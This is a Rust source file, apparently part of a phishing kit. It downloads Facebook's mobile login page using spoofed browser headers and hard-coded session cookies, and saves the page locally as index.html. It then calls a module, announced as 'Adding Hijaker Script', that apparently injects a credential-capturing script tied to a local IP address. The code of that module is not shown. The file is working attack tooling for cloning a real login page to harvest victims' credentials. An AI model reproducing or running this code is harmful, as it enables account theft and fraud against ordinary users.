use reqwest;
use std::fs::File;
use std::io::prelude::*;
use crate::html_mod;

pub fn facebook(iplocal: &str) { 

    let url = "https://web.facebook.com/login/device-based/regular/login/?login_attempt=0";
    let client = reqwest::blocking::Client::builder()
        .user_agent("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36")
        .build()
        .expect("No se pudo crear el cliente HTTP");

    let mut headers = reqwest::header::HeaderMap::new();
    headers.insert("authority", "web.facebook.com".parse().unwrap());
    headers.insert("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7".parse().unwrap());
    headers.insert("accept-language", "es-MX,es;q=0.9".parse().unwrap());
    headers.insert("cache-control", "no-cache".parse().unwrap());
    headers.insert("cookie", "sb=eYACZWU3F_hfUCcd7qKxYXWu; datr=eYACZez9bS6XjlOolzLBxjwm; fr=0dOraNKpIA0W5VeSW..BlAoB5.Sm.AAA.0.0.BlAoO4.AWUDk_GEvG8; wd=980x805".parse().unwrap());
    headers.insert("pragma", "no-cache".parse().unwrap());
    headers.insert("sec-ch-ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"".parse().unwrap());
    headers.insert("sec-ch-ua-mobile", "?1".parse().unwrap());
    headers.insert("sec-ch-ua-platform", "\"Android\"".parse().unwrap());
    headers.insert("sec-fetch-dest", "document".parse().unwrap());
    headers.insert("sec-fetch-mode", "navigate".parse().unwrap());
    headers.insert("sec-fetch-site", "none".parse().unwrap());
    headers.insert("sec-fetch-user", "?1".parse().unwrap());
    headers.insert("upgrade-insecure-requests", "1".parse().unwrap());

    let response = client.get(url).headers(headers).send();

    match response {
        Ok(mut res) => {
            if res.status().is_success() {
 
                let mut body = Vec::new();
                res.read_to_end(&mut body).expect("No se pudo leer la respuesta");
                 
                let mut file = File::create("index.html").expect("No se pudo crear el archivo");
                file.write_all(&body).expect("No se pudo escribir en el archivo");
                println!("Site cloned successfully\nAdding Hijaker Script...");
                html_mod::facebook(iplocal).expect("File not found");

            } else {
                println!("Error al descargar la URL: {}", res.status());
            }
        }
        Err(err) => {
            eprintln!("Error al hacer la solicitud GET: {:?}", err);
        }
    }
}
